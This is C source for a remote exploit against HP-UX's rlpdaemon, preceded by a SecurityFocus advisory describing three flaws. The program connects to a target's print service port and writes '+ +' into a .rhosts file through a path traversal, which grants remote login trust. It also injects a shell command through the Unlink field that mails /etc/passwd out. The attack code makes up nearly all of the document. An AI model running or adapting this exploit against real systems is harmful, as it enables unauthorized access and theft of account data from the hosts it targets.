/*
source: http://www.securityfocus.com/bid/150/info

A number of vulnerabilities exist in Hewlett Packard's rlpdaemon under HPUX 9.x and 10.x. These vulnerabilities may allow for a remote attacker to access the system under the lp user account, as well as execute arbitrary commands remotely, also as user lp.

There are three vulnerabilities: (culled from RSI Advisory RSI.0006.06-25-98.HP-UX.RLPDAEMON) 

#1: The argument in the Unlink Data File section of the control file gets passed to /bin/rm by a system () call. This argument should normally be a filename, however, a semi-colon and an arbitrary command can be appended allowing you to execute commands as user lp.

#2: When the client passes a file to the rlpdaemon, no sanity checks are performed to ensure the validity of the filename. This allows for a remote attacker to send any file s/he wants and have it stored in the user lp's home directory.

#3: The rlpdaemon will allow remote connections from any source port. This violates the lpd behavior recommended in RFC-1179 which explicitly states that only source ports of 721-731 should be allowed to access the daemon.
*/

/*** lpd-mail.c
**
** Experiments with the BSD-style 'lpd' protocol.
** Gus '98
**
** Modified by Gamma to support sending "Mail When Printed". Use
** in conjunction with lpd-touch.
**
** Notes: Potential exploitation of lpd by specifying alternate
**        sendmail alias file to use etc.  However, there areseveral
**        problems which come up to hinder progress.  Here is
**        not the place to go into details, have a play around
**        yourself.
**
**        Eg. ./lpd-mail localhost lp "-oA/var/spool/lpd/x" .
**
**        Will attempt to use /var/spool/lpd/x@..db as an alternative
**        alias file.  Downfall is you are unable to specify a
**        recipiant to pass to sendmail, it gets ran as uid 1 and
**        cannot write to /var/spool/mqueue.  YMMV though depending
**        on the version of Sendmail running.  Multiple versions
**        of Sendmail always drops setuid though so no matter what
**        alternate alias, sendmail.cf file you pass it, problems will
**        arise when it comes to writing to /var/spool/mqueue.
**
** References: RFC-1179
**
** Greets: Gus for lpd-rm, pr0pane for mad discussions, Ao12M, #phuk
**
** lpd-mail.c Send mail when print job has finished
** Usage: ./lpd-mail <target> <printer> <user> <userhost>          */




/*
This program is re-written by LigerTeam

Unpublished hp-ux rlpdaemon exploit of LigerTeam

Security LigerTeam
homepage   : http://liger.fnetwork.com
Contact Us : ligerteam@hotmail.com

Wrote rlpdaemon exploit in 1999.?.?

You can get original information at http://www.repsec.com about it.
and  http://www.securityfocus.com/vdb/bottom.html?vid=150

Note:
don't use hacking

*/







#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include<arpa/inet.h>
/* Control codes for commands.           No spaces unless specified  */
#define LPD_RECIEVE_JOB '\2'           /* \2 printername <lf> */
#define CMD_RECIEVE_CONTROL_FILE '\2'  /* \2 size <space> name <lf> */
#define CMD_RECIEVE_DATA_FILE '\3'     /* \3 size <space> name <lf> */
#define CMD_CLASSNAME 'C'              /* C classname <lf> */
#define CMD_HOSTNAME 'H'               /* H hostname <lf> */
#define CMD_JOBNAME 'J'                /* J jobname <lf> */
#define CMD_PRINTBANNERPAGE 'L'        /* L username <lf */
#define CMD_MAIL_WHEN_PRINTED 'M'

/* M username@host <lf> */
#define CMD_SOURCEFILENAME 'N'      /* N filename <lf> */
#define CMD_USERNAME 'P'            /* P user-requesting-job <lf> */
#define CMD_UNLINK 'U'              /* U filename <lf> */
#define CMD_PRINTFORMATTEDFILE 'f'  /* f Filename of pre-formatted text*/

void usage(char *);
int doit(int ,char *,char *, char *, char *);
int openhost (char *);


int main (int argc, char*argv[]) {

  int port,sock;
  char *target,*printer,*user,*userhost;

  port = 0;
  target = printer = user = userhost = NULL;

  fprintf(stderr,"'lpd-mail.c' - Gus'98 with mods by Gamma\n");
  if (argc < 5) usage(argv[0]);

  printf("Start !!!!!!!!!!!!\n");
  target = argv[1];
  printer = argv[2];
  user = argv[3];
  userhost = argv[4];
  if ((sock = openhost(target)) > 0) {
    exit(doit(sock,printer,target,user,userhost));
  } else {
    exit(sock);
  }
}


int openhost (char *target) {

  int sock;
  struct hostent *he;
  struct sockaddr_in sa;
  int localport;

/*  he=gethostbyname(target);
  if(he==NULL) {
    fprintf(stderr,"Bad hostname");
    return (-1);
  }*/


  /* According to the RFC, the source port must be in the range
   of 721-731 inclusive. */

/*  srand(getpid());
  localport = 721 + (int) (10.0*rand()/(RAND_MAX+1.0));
*/

  sock=socket(AF_INET,SOCK_STREAM,0);

/* sa.sin_addr.s_addr=INADDR_ANY;  */
  sa.sin_family=AF_INET;
/* sa.sin_port=htons(localport);

  bind(sock,(struct sockaddr *)&sa,sizeof(sa));*/
  sa.sin_port=htons(515);
  sa.sin_addr.s_addr=inet_addr(target);
/* memcpy(&sa.sin_addr,he->h_addr,he->h_length); */
  if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) < 0) {
    perror("Can't connect");
    return (-1);
  } else {
    fcntl(sock,F_SETFL,O_NONBLOCK);
  }
  printf("Source port: %d  : Connected...\n",localport);
  return(sock);
}



int doit(int sock,char *printer,char *target, char *user, char *userhost){

  char hello[255];
  char sendbuf[1024];
  char respbuf[255];
  int readn;
  /* Hello Mr LPD. Can I print to <printer> please ? */
  sprintf(sendbuf,"%c%s\n",LPD_RECIEVE_JOB,printer);
  if ((write(sock,sendbuf,strlen(sendbuf)) != (strlen(printer)+2))) {
    perror("1 write");
  }

  /* Why yes young man, what would you like me to do ? */
  readn=read(sock,respbuf,255);
   printf(": %s i read%d\n",respbuf,readn);


  /*  Would you be so kind as to carry out the commands in this file
   *  as superuser without giving up any priviledges please ?
   */
/*  sprintf(sendbuf,"%c%s\n%croot\n%cmyjobname\n%c%s\n%croot\n%c%s\n%cdfA
                     \n%c;/bin/mail guest@localhost </etc/passwd\n
                     %c/var/spool/lp/.rhosts",
          CMD_HOSTNAME,
          userhost,
          CMD_USERNAME,
          CMD_JOBNAME,
          CMD_CLASSNAME,
          target,
          CMD_PRINTBANNERPAGE,
          CMD_MAIL_WHEN_PRINTED,
          user,
          CMD_PRINTFORMATTEDFILE,CMD_UNLINK,CMD_SOURCEFILENAME);
    */
  /* But of course young feller me lad! Security is for girls! */

  /*sprintf(hello,"%c%d cfA13\n",
          CMD_RECIEVE_CONTROL_FILE,strlen(sendbuf));
  printf("Sent hello.\n");
  if (write(sock,hello,strlen(hello)) != strlen(hello)) perror("2 write");
  if (write(sock,sendbuf,strlen(sendbuf)+1) != (strlen(sendbuf)+1)) {
    perror("3 write");
  } */
  printf("Sent command set.\n");
  /*read(sock,respbuf,256);*/

strcat(sendbuf,"+ +");
sprintf(hello,"%c%d ../../.rhosts\n", 
CMD_RECIEVE_DATA_FILE,strlen(sendbuf));


   printf(" send data file \n");
if ( write(sock,hello,strlen(hello)) !=strlen(hello)) perror("3 write");
if ( write(sock,sendbuf,strlen(sendbuf)+1) != ( strlen(sendbuf) + 1 )) {
      perror("3 write ");
}
sprintf(sendbuf,"%c%s\n%croot\n%cmyjobname\n%c%s\n%croot\n%c%s\n%c..
      \n%c;/bin/mail guest@localhost </etc/passwd\n
                  %c../../.rhosts",
                  CMD_HOSTNAME,
                  userhost,
                  CMD_USERNAME,
                  CMD_JOBNAME,
                  CMD_CLASSNAME,
                  target,
                  CMD_PRINTBANNERPAGE,
                  CMD_MAIL_WHEN_PRINTED,
                  user,
                  CMD_PRINTFORMATTEDFILE,CMD_UNLINK,CMD_SOURCEFILENAME);
printf(" making send buf \n");


sprintf(hello,"%c%d cfA16\n",CMD_RECIEVE_CONTROL_FILE,strlen(sendbuf));
printf("send control file \n");
if ( write(sock,hello,strlen(hello)) != strlen(hello)) perror("2 write\n");
if  ( write(sock,sendbuf,strlen(sendbuf)+1) != (strlen(sendbuf) +1)) {
perror("3 write \n");
         }

    read(sock,respbuf,256);
    sleep(3);
    shutdown(sock,2);

  return (0);
}


void usage (char *name) {
  fprintf(stderr,"Usage: %s <target> <printer> <user> <userhost>\n",name);
  exit(1);
}
-----------------------------------------------------------------------------
- The Security LigerTeam 2000 KOREA -